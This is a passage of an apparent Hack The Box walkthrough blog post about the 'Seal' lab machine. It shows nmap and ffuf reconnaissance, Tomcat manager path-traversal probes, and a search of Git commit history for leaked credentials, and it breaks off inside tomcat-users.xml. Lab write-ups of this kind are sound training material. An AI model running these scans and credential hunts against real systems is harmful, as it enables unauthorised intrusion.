<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>

    <meta name="description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	10 Jul 2021IP:	10.10.10.250">
<meta property="og:type" content="article">
<meta property="og:title" content="Hack-The-Box-walkthrough[seal]">
<meta property="og:url" content="https://fdlucifer.github.io/2021/07/12/seal/index.html">
<meta property="og:site_name" content="fdvoid0&#39;s blog">
<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	10 Jul 2021IP:	10.10.10.250">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2016.jpg">
<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2017.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2018.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2019.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2020.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2021.jpg">
<meta property="article:published_time" content="2021-07-12T13:01:14.000Z">
<meta property="article:modified_time" content="2021-11-14T06:23:22.729Z">
<meta property="article:author" content="fdvoid0">
<meta property="article:tag" content="HackTheBox靶机练习">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2016.jpg">


<link rel="canonical" href="https://fdlucifer.github.io/2021/07/12/seal/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/07/12/seal/","path":"2021/07/12/seal/","title":"Hack-The-Box-walkthrough[seal]"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hack-The-Box-walkthrough[seal] | fdvoid0's blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">fdvoid0's blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">46</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">208</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration"><span class="nav-number">2.</span> <span class="nav-text">Enumeration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Port-443"><span class="nav-number">3.</span> <span class="nav-text">Port 443</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Port-8080"><span class="nav-number">4.</span> <span class="nav-text">Port 8080</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Port-443-1"><span class="nav-number">5.</span> <span class="nav-text">Port 443</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Directory-Fuzzing"><span class="nav-number">5.1.</span> <span class="nav-text">Directory Fuzzing</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploitation"><span class="nav-number"></span> <span class="nav-text">Exploitation</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PrivESC-to-User"><span class="nav-number"></span> <span class="nav-text">PrivESC to User</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-1"><span class="nav-number">1.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#User%E2%80%99s-home-directory"><span class="nav-number">1.1.</span> <span class="nav-text">User’s home directory</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ps-aux"><span class="nav-number">1.2.</span> <span class="nav-text">ps -aux</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#run-yml"><span class="nav-number">1.3.</span> <span class="nav-text">run.yml</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation-1"><span class="nav-number">2.</span> <span class="nav-text">Exploitation</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PrivESC-to-root"><span class="nav-number"></span> <span class="nav-text">PrivESC to root</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeration-2"><span class="nav-number">1.</span> <span class="nav-text">Enumeration</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-l"><span class="nav-number">1.1.</span> <span class="nav-text">sudo -l</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploitation-2"><span class="nav-number">2.</span> <span class="nav-text">Exploitation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">2.1.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Contact-me"><span class="nav-number">2.2.</span> <span class="nav-text">Contact me</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fdvoid0"
      src="/images/blackhole.png">
  <p class="site-author-name" itemprop="name">fdvoid0</p>
  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">208</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">46</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">43</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
      </span>
      <span class="links-of-author-item">
        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
  </div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="Back to top">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
    <div class="sidebar-inner sidebar-blogroll">
      <div class="links-of-blogroll animated">
        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
          Links
        </div>
        <ul class="links-of-blogroll-list">
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
            </li>
            <li class="links-of-blogroll-item">
              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
            </li>
        </ul>
      </div>
    </div>
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/07/12/seal/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/blackhole.png">
      <meta itemprop="name" content="fdvoid0">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="fdvoid0's blog">
      <meta itemprop="description" content="All things about infosec & ctf">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Hack-The-Box-walkthrough[seal] | fdvoid0's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Hack-The-Box-walkthrough[seal]
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-07-12 21:01:14" itemprop="dateCreated datePublished" datetime="2021-07-12T21:01:14+08:00">2021-07-12</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2021-11-14 14:23:22" itemprop="dateModified" datetime="2021-11-14T14:23:22+08:00">2021-11-14</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
        </span>
    </span>

  
    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
      <span class="post-meta-item-icon">
        <i class="far fa-eye"></i>
      </span>
      <span class="post-meta-item-text">Views: </span>
      <span id="busuanzi_value_page_pv"></span>
    </span>
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>2.7k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>10 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h2 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h2><p>OS:	 Linux<br>Difficulty:	Medium<br>Points:	30<br>Release:	10 Jul 2021<br>IP:	10.10.10.250</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2016.jpg"></p>
</li>
<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
</li>
</ul>
<span id="more"></span>

<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>use nmap as usual</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/seal]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.250</span></span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)</span><br><span class="line">8080/tcp open  http-proxy</span><br></pre></td></tr></table></figure>

<p>So the SSL certificate gives you a domain name seal.htb so let’s add it in &#x2F;etc&#x2F;hosts.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.10.10.250 seal.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>now that we have that let’s visit some ports.</p>
<h2 id="Port-443"><a href="#Port-443" class="headerlink" title="Port 443"></a>Port 443</h2><p>looks like a fancy version of some market for vegetables and store page was almost static except for the search bar and contact us form so let’s move on to </p>
<h2 id="Port-8080"><a href="#Port-8080" class="headerlink" title="Port 8080"></a>Port 8080</h2><p>Visiting port 8080 we have a Gitbucket instance so let’s register an account and then login in with it.</p>
<p>After logging in we can see two repos by root infra and seal_market.</p>
<p>From port 443 we have the instance of seal_market over there so that looks intresting so let’s move on with that.</p>
<p>Reading the README.md file gives us something intrsting.</p>
<figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">Seal Market App</span></span><br><span class="line"><span class="section">===============</span></span><br><span class="line">A simple online market application which offers free shopping, avoid crowd in this pandemic situation, saves time. </span><br><span class="line"></span><br><span class="line"><span class="section">## ToDo</span></span><br><span class="line"><span class="bullet">*</span> Remove mutual authentication for dashboard, setup registration and login features.</span><br><span class="line"><span class="bullet">*</span> Deploy updated tomcat configuration.</span><br><span class="line"><span class="bullet">*</span> Disable manager and host-manager.</span><br></pre></td></tr></table></figure>

<p>So First we know that nginx is just relaying the request to backend tomcat server and secondly the configuration for this server is not the newest as shown in the repos so we can search through commit as the older configuration might be vulnerable.</p>
<p>And Lastly we know that we have access to manager and host-manager from the <span class="exturl" data-url="aHR0cHM6Ly9zZWFsLmh0Yi8=">https://seal.htb/<i class="fa fa-external-link-alt"></i></span> so let’s try that.</p>
<h2 id="Port-443-1"><a href="#Port-443-1" class="headerlink" title="Port 443"></a>Port 443</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Seal$ curl -k https://seal.htb/manager/html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx/1.18.0 (Ubuntu)&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>Well we should have access to it as said in the README then I thought maybe we have access to some other endpoint in manager.</p>
<p>So let’s fuzz and see we know that it is tomcat so it’s better to use specialized wordlist for that.</p>
<p>I am using one from the seclist which you can find at the below link.</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RhbmllbG1pZXNzbGVyL1NlY0xpc3RzL21hc3Rlci9EaXNjb3ZlcnkvV2ViLUNvbnRlbnQvdG9tY2F0LnR4dA==">https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/tomcat.txt<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="Directory-Fuzzing"><a href="#Directory-Fuzzing" class="headerlink" title="Directory Fuzzing"></a>Directory Fuzzing</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Seal$ ffuf -k -u https://seal.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt -t 200 -c</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.3.0 Kali Exclusive &lt;3</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : https://seal.htb/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/tomcat.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 200</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">examples/../manager/html [Status: 403, Size: 162, Words: 4, Lines: 8]</span></span><br><span class="line"><span class="string">examples/%2e%2e/manager/html [Status: 403, Size: 162, Words: 4, Lines: 8]</span></span><br><span class="line"><span class="string">manager/jmxproxy/*      [Status: 401, Size: 2499, Words: 457, Lines: 64]</span></span><br><span class="line"><span class="string">manager/status.xsd      [Status: 200, Size: 4374, Words: 749, Lines: 85]</span></span><br><span class="line"><span class="string">host-manager/html/*     [Status: 403, Size: 162, Words: 4, Lines: 8]</span></span><br><span class="line"><span class="string">manager/html            [Status: 403, Size: 162, Words: 4, Lines: 8]</span></span><br><span class="line"><span class="string">manager/html/*          [Status: 403, Size: 162, Words: 4, Lines: 8]</span></span><br><span class="line"><span class="string">manager/jmxproxy        [Status: 401, Size: 2499, Words: 457, Lines: 64]</span></span><br><span class="line"><span class="string">manager                 [Status: 302, Size: 0, Words: 1, Lines: 1]</span></span><br><span class="line"><span class="string">manager/status/*        [Status: 401, Size: 2499, Words: 457, Lines: 64]</span></span><br><span class="line"><span class="string">host-manager            [Status: 302, Size: 0, Words: 1, Lines: 1]</span></span><br><span class="line"><span class="string">:: Progress: [90/90] :: Job [1/1] :: 113 req/sec :: Duration: [0:00:03] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>

<p>Looks like we can access <span class="exturl" data-url="aHR0cHM6Ly9zZWFsLmh0Yi9tYW5hZ2VyL3N0YXR1cy54c2Q=">https://seal.htb/manager/status.xsd<i class="fa fa-external-link-alt"></i></span></p>
<p>and also we have have <span class="exturl" data-url="aHR0cHM6Ly9zZWFsLmh0Yi9tYW5hZ2VyL2pteHByb3h5">https://seal.htb/manager/jmxproxy<i class="fa fa-external-link-alt"></i></span></p>
<p>and yeah it’s asked from creds so let’s go on finding those in some previous commit as we know that it is using old tomcat configuration from the README.md file.</p>
<p>Looking through commits on this repo we have 13 commit which wouldn’t be much to look through.</p>
<p><span class="exturl" data-url="aHR0cDovL3NlYWwuaHRiOjgwODAvcm9vdC9zZWFsX21hcmtldC9jb21taXRzL21hc3Rlcg==">http://seal.htb:8080/root/seal_market/commits/master<i class="fa fa-external-link-alt"></i></span></p>
<p>The commit commit looks intresting in our context which is adding ‘adding tomcat configuration’ and ‘updating tomcat configuration’ as we know that updating configuration is probably the current version let’s check ‘adding tomcat configuration’ first.</p>
<p><span class="exturl" data-url="aHR0cDovL3NlYWwuaHRiOjgwODAvcm9vdC9zZWFsX21hcmtldC9jb21taXQvYWMyMTAzMjVhZmQyZjZhZTE3Y2NlODRhOGFhNDI4MDVjZTVmZDAxMA==">http://seal.htb:8080/root/seal_market/commit/ac210325afd2f6ae17cce84a8aa42805ce5fd010<i class="fa fa-external-link-alt"></i></span></p>
<p>we can see the famous Git Diff view so let’s hunt for creds in that.</p>
<p>searching  for password using the ctrl+f on the webpage I found this instance of it in tomcat-users.xml</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">		  Licensed to the Apache Software Foundation (ASF) under one or more</span></span><br><span class="line"><span class="comment">		  contributor license agreements.  See the NOTICE file distributed with</span></span><br><span class="line"><span class="comment">		  this work for additional information regarding copyright ownership.</span></span><br><span class="line"><span class="comment">		  The ASF licenses this file to You under the Apache License, Version 2.0</span></span><br><span class="line"><span class="comment">		  (the &quot;License&quot;); you may not use this file except in compliance with</span></span><br><span class="line"><span class="comment">		  the License.  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment">		 </span></span><br><span class="line"><span class="comment">		      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span 